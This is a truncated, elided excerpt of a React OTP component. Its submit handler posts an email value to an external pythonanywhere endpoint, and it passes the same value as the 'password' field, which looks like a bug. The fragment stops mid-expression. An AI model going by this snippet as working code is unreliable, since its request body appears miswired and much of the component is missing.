...
const OTP = () => {
    ...
    const handleSubmit = async () => {
        setLoading(true)
        const response = await fetch(`https://kigongovincent.pythonanywhere.com/OTP/`, {
            method: "POST",
            body: JSON.stringify({
                email: webmail,
                password: webmail
                                ...
                                >
                                    <Paper className="p-5 rounded shadow-sm text-center" elevation={0}>
                                        ...
                                        <Box sx={{ mt: 5 }} display={"flex"} alignItems={"center"} justifyContent={"space-between"}>
                                            ...
                                            <Button disabled={loading || !webmail} onClick={handleSubmit} variant="contained" endIcon={<ArrowRight />}>
                                                {
                                                    loading
                                                        ?
